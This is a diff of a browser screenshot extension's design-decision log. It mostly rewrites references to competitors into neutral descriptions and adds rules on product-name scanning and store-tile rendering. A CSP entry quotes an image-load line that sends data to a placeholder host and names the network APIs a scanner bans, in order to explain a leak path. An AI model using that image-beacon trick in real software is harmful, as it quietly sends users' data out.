@@ -18,7 +18,7 @@ transpiler, no minifier, no npm packages, not even in tests.
 **Consequences.** Anything a library would give us is written by hand: the zip
 writer, the PNG writer and the PDF writer. Tests use Node's built in
 runner. The payoff is that `diff -r` against an installed extension is a complete
-audit, which no competitor can offer. This is the property everything else defends.
+audit. This is the property everything else defends.
 
 ## D2: `chrome.storage.local` only, never `sync`
 
@@ -105,7 +105,8 @@ retires this compromise.
 
 ## D9: The toolbar button captures immediately, with no popup
 
-**Context.** Most competitors open a popup with a menu of capture modes.
+**Context.** The common pattern in this category is a popup with a menu of
+capture modes.
 
 **Decision.** One click captures. `default_popup` is empty in the manifest and is set
 only for the duration of a capture, so a second click during a capture shows progress
@@ -164,8 +165,9 @@ tracking and scale instead. Recorded so no future design pass "fixes" it.
 
 ## D14: Apply and Discard staging was considered and rejected
 
-**Context.** The competitor stages edits until the user presses Apply, and their
-locale strings contain five separate "you have unapplied edits" dialogs.
+**Context.** A staging model, where edits are held until the user presses Apply
+and a dialog warns about unapplied work, is the common alternative to editing
+live.
 
 **Decision.** Not adopted. The live object model already makes every edit reversible,
 so staging would add a mode the model does not need. What is adopted instead is the
@@ -183,7 +185,7 @@ Maintainer decision, 2026-09-08.
 `connect-src 'none'` blocks `fetch`, `XMLHttpRequest`, WebSocket and
 `navigator.sendBeacon`, and `test/lib/scan.js` bans those four names by pattern.
 
-Studying a competitor's "watermark from an image URL" feature exposed the gap. In
+Thinking through a "watermark from an image URL" feature exposed the gap. In
 CSP, a directive that is absent **and** has no `default-src` to fall back on is
 unrestricted. Our policy names no `default-src`, so `img-src`, `style-src`,
 `font-src` and `media-src` are wide open. `new Image().src = 'https://x/?d=' + data`
@@ -275,13 +277,13 @@ and a hidden tool must still be reachable, which is one of the arguments for the
 command palette (F18). F24 must land before any release that adds toolbar controls.
 Decided 2026-09-09.
 
-## D18: The toolbar follows Preview's grouping model
+## D18: The toolbar groups controls the way annotation toolbars do
 
 **Context.** D17 settled that the toolbar is configured rather than collapsed. It did
-not settle how the controls that remain are arranged. Four screenshots of macOS
-Preview's markup toolbar, provided 2026-09-09, answer that.
+not settle how the controls that remain are arranged. The grouping convention that
+desktop annotation toolbars have converged on, reviewed 2026-09-09, answers that.
 
-Preview exposes roughly sixty controls through **thirteen buttons**:
+The convention exposes roughly sixty controls through **thirteen buttons**:
 
 - **Every button carries a small chevron.** Clicking the button uses the tool or
   applies the current value; clicking the chevron opens a popover holding the whole
@@ -293,9 +295,10 @@ Preview exposes roughly sixty controls through **thirteen buttons**:
   popover holds five stroke weights, two dash patterns, three arrow endings and a
   shadow toggle. One "Text Style" popover holds family, size, colour, bold, italic,
   underline and four alignments.
-- **Heavy tools get a floating inspector, not a popover.** Adjust Colour opens a
-  panel with a live histogram, nine sliders, Auto Levels and Reset All.
-- **The whole markup row is itself hidden** behind one button in the window toolbar.
+- **Heavy tools get a floating inspector, not a popover.** A colour adjustment
+  control opens a panel with a live histogram, nine sliders and a reset.
+- **The whole annotation row is itself hidden** behind one button in the window
+  toolbar.
 
 **Decision.** Adopt the pattern. The editor toolbar becomes roughly eighteen buttons:
 Select, Shapes (box, ellipse, line, arrow, highlight behind one chevron), Draw, Text,
@@ -351,10 +354,10 @@ The task is T20 and it ships in 1.7.0, ahead of the toolbar, because it is a rep
 native `<input type="color">` next to a hex text field. It is not a hand-drawn
 saturation square with a hue slider, which is what the preview sketched.
 
-**Why.** Preview's own *Show Colours…* opens the macOS system colour panel rather
-than a picker Apple drew inside Preview. Copying the pattern properly therefore
-means opening the platform picker, and doing so gets three things we would
-otherwise have to build and would build worse: an eyedropper that can sample any
+**Why.** The convention for a custom colour entry is to open the platform's own
+colour panel rather than draw a picker inside the application, and following it
+properly means doing the same. Doing so gets three things we would otherwise have
+to build and would build worse: an eyedropper that can sample any
 pixel on the screen, full keyboard operation, and the recent-colours list the user
 already has from every other application.
 
@@ -766,8 +769,8 @@ git history still carried every one of them. Twenty two commits, one author, no
 forks, no published tags, no open pull requests, and nobody but the maintainer had
 ever cloned it. The claims removed were the kind whose whole problem is that they
 are readable: an assertion that a named extension shipped malware, install counts
-repeated from news coverage, a path to a competitor's unpacked extension on the
-maintainer's disk.
+repeated from news coverage, and a local filesystem path that named another
+extension.
 
 **Decision.** Rebuild the history from the sanitised tree, as a single commit, and
 publish that. The alternative considered was a text replacement across all twenty
@@ -2009,3 +2012,76 @@ And the panel was 244px with a plate slider that got 56 of them. The text
 inspector is the densest thing in the toolbar and it was the one panel that had
 never been widened for what had been added to it. 272px, and both rows fill it
 and end in the same place.
+
+## D68: A product name that is also an ordinary word still needs a rule
+
+**Date.** 2026-09-11, before the repository's first store submission.
+
+**Context.** D34 banned naming other products in the shipped surface and the prose,
+and `scanBrands` enforces it against a list of names. One name was deliberately left
+off that list: an application whose name is also an ordinary English word this
+codebase uses constantly for render previews. The reasoning was sound as far as it
+went, a rule that cannot be obeyed is worse than none, and it was written down.
+
+What it missed is that the exemption was doing real work in the wrong direction. The
+toolbar decision, five entries in the task list, two changelog entries and an
+architecture note all stated in writing that the design had been modelled on
+screenshots of that named application, with the screenshot timestamps recorded.
+Every one of those lines passed the scanner, because the only word that would have
+caught them had been excused.
+
+**Decision.** Keep the exemption for the bare word and add `PRODUCT_PHRASES`, a
+short list of case sensitive patterns matching the shapes the ordinary word never
+takes: a capitalised possessive, and the full name of the application. "the preview
+pane" and "a render preview" stay legal. The capitalised possessive of that word,
+followed by a description of a toolbar, is the phrasing that was in this file for
+two weeks, and it now fails the suite.
+
+This paragraph is why the rule is written as a pattern rather than a list of
+example sentences: the first draft of it quoted the banned phrasing to explain the
+ban, and the scanner caught the explanation. A rule whose own documentation cannot
+state the rule is a rule with no exceptions, which is the point.
+
+The prose was rewritten at the same time to describe the convention rather than
+whose it is, which is both safer and more accurate: chevron popovers, a glyph that
+shows its own state, and grouping by concept are conventions the whole category
+shares, and they belong to nobody.
+
+**Consequences.** A second scanner list to keep, and a small one, because the rule
+only pays for itself on names that are also ordinary words. Each pattern is proven
+to fire against the poisoned fixture, so deleting one fails the suite rather than
+quietly reopening the hole. The comparison table that characterised three unnamed
+extensions by manifest, dependency list and install size went at the same time: the
+claim this product makes stands on its own manifest, and a table of other people's
+is a document with no upside.
+
+**Not legal advice.** Engineering hygiene, decided by the maintainer. Nobody here is
+a lawyer.
+
+## D69: The store tiles are drawn from a source, not kept as finished pixels
+
+**Date.** 2026-09-11.
+
+**Context.** The 440x280 small tile and the 1400x560 marquee were made once and
+committed as PNGs. The small tile shipped with its footer line cut in half by the
+bottom edge, and nothing caught it: a tile is checked by looking at it, it was
+looked at once, and there was nothing to re-render when the defect was found.
+
+**Decision.** `tools/make-promo.mjs` lays both tiles out as ordinary HTML, renders
+them in real Chrome at exactly the sizes the store asks for, and writes the PNGs.
+Before each screenshot it asks the layout whether any text or image sits outside the
+padded box, and refuses to write the file if anything does.
+
+**Why not the icon rasteriser.** `tools/lib/png.mjs` draws the icons and checks them
+byte for byte, which is the stronger guarantee, and it cannot draw type. A tile is
+mostly type. Chrome can set type and is already a dependency of the test suite.
+
+**Consequences.** These two PNGs are the only committed artefacts in the repository
+that are **not** byte reproducible: Chrome renders text with the host's fonts and
+hinting, so the same source on another machine gives a visually identical tile with
+different bytes. That is why there is no `--check` mode here, and why this is
+recorded rather than left to be discovered. What the tool guarantees is that the
+design has a source and that the clipping defect cannot come back, not that the file
+is a constant. The tiles are not shipped in the extension, so nothing about the
+`diff -r` audit changes.
+
